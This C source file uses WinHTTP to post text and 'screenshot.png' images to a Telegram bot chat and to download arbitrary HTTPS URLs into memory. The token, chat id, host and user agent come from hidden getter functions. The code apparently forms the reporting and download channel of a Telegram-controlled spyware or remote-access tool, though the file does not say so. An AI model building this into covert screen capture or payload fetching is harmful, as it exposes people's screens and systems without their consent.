#include "../include/telegram.h"

// Cached WinHTTP Session Handle for High-Performance Reuse
static HINTERNET g_hSession = NULL;

static HINTERNET GetHttpSession() {
    if (!g_hSession) {
        wchar_t wUa[256];
        MultiByteToWideChar(CP_ACP, 0, get_useragent(), -1, wUa, 256);
        g_hSession = WinHttpOpen(wUa, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    }
    return g_hSession;
}

void url_encode(const char* src, char* dst, size_t dstSize) {
    const char* hex = "0123456789ABCDEF";
    size_t j = 0;
    for (size_t i = 0; src[i] && j < dstSize - 3; i++) {
        unsigned char c = src[i];
        if (c == ' ') { dst[j++] = '%'; dst[j++] = '2'; dst[j++] = '0'; }
        else if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                 (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            dst[j++] = c;
        } else {
            dst[j++] = '%';
            dst[j++] = hex[c >> 4];
            dst[j++] = hex[c & 0x0F];
        }
    }
    dst[j] = '\0';
}

int SendTextToTelegram(const char* message) {
    char encoded[4096];
    url_encode(message, encoded, sizeof(encoded));
    char url[8192];
    sprintf_s(url, sizeof(url),
              "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
              get_token(), get_chat_id(), encoded);

    const char* p = url;
    if (strstr(p, "https://") == p) p += 8;
    char host[256] = {0}, path[4096] = {0};
    const char* slash = strchr(p, '/');
    if (slash) { strncpy_s(host, sizeof(host), p, slash - p); strcpy_s(path, sizeof(path), slash); }
    else { strcpy_s(host, sizeof(host), p); strcpy_s(path, sizeof(path), "/"); }

    HINTERNET hSession = GetHttpSession();
    if (!hSession) return 0;

    wchar_t wHost[256], wPath[4096];
    MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 256);
    MultiByteToWideChar(CP_ACP, 0, path, -1, wPath, 4096);

    HINTERNET hConnect = WinHttpConnect(hSession, wHost, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return 0;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return 0; }

    BOOL sent = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    DWORD status = 0;
    if (sent && WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD len = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &len, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return (status == 200);
}

int SendPhotoToTelegram(const BYTE* imageData, DWORD imageSize) {
    char boundary[64];
    sprintf_s(boundary, sizeof(boundary), "----Boundary%08X", GetTickCount());
    char* token = get_token();
    char* chat = get_chat_id();
    char* host = get_host();

    char header[2048];
    int headerLen = sprintf_s(header, sizeof(header),
                              "--%s\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n%s\r\n"
                              "--%s\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n"
                              "Content-Type: image/png\r\n\r\n", boundary, chat, boundary);
    char footer[128];
    int footerLen = sprintf_s(footer, sizeof(footer), "\r\n--%s--\r\n", boundary);
    DWORD totalLen = headerLen + imageSize + footerLen;
    BYTE* body = (BYTE*)malloc(totalLen);
    if (!body) return 0;

    BYTE* ptr = body;
    memcpy(ptr, header, headerLen); ptr += headerLen;
    memcpy(ptr, imageData, imageSize); ptr += imageSize;
    memcpy(ptr, footer, footerLen);

    wchar_t wHost[256], wPath[512];
    MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 256);
    char pathBuf[512];
    sprintf_s(pathBuf, sizeof(pathBuf), "/bot%s/sendPhoto", token);
    MultiByteToWideChar(CP_ACP, 0, pathBuf, -1, wPath, 512);

    HINTERNET hSession = GetHttpSession();
    if (!hSession) { free(body); return 0; }

    HINTERNET hConnect = WinHttpConnect(hSession, wHost, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { free(body); return 0; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); free(body); return 0; }

    char contentType[256];
    sprintf_s(contentType, sizeof(contentType), "Content-Type: multipart/form-data; boundary=%s", boundary);
    wchar_t wContentType[256];
    MultiByteToWideChar(CP_ACP, 0, contentType, -1, wContentType, 256);

    DWORD status = 0;
    if (WinHttpSendRequest(hRequest, wContentType, (DWORD)-1, body, totalLen, totalLen, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD len = sizeof(status);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status, &len, NULL);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    free(body);
    return (status == 200);
}

BYTE* DownloadURL(const char* url, DWORD* outSize) {
    *outSize = 0;
    char host[256] = {0}, path[512] = {0};
    if (strstr(url, "https://") == url) {
        const char* after = url + 8;
        const char* slash = strchr(after, '/');
        if (slash) { strncpy_s(host, after, slash - after); strcpy_s(path, slash); }
        else { strcpy_s(host, after); strcpy_s(path, "/"); }
    } else return NULL;

    wchar_t wHost[256], wPath[512];
    MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 256);
    MultiByteToWideChar(CP_ACP, 0, path, -1, wPath, 512);

    HINTERNET hSession = GetHttpSession();
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, wHost, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return NULL;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return NULL; }

    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    DWORD size = 0, read = 0;
    BYTE* buffer = NULL;
    BYTE temp[4096];
    do {
        if (WinHttpReadData(hRequest, temp, sizeof(temp), &read)) {
            if (read == 0) break;
            BYTE* newBuf = (BYTE*)realloc(buffer, size + read);
            if (!newBuf) { free(buffer); buffer = NULL; break; }
            buffer = newBuf;
            memcpy(buffer + size, temp, read);
            size += read;
        }
    } while (read > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);

    *outSize = size;
    return buffer;
}
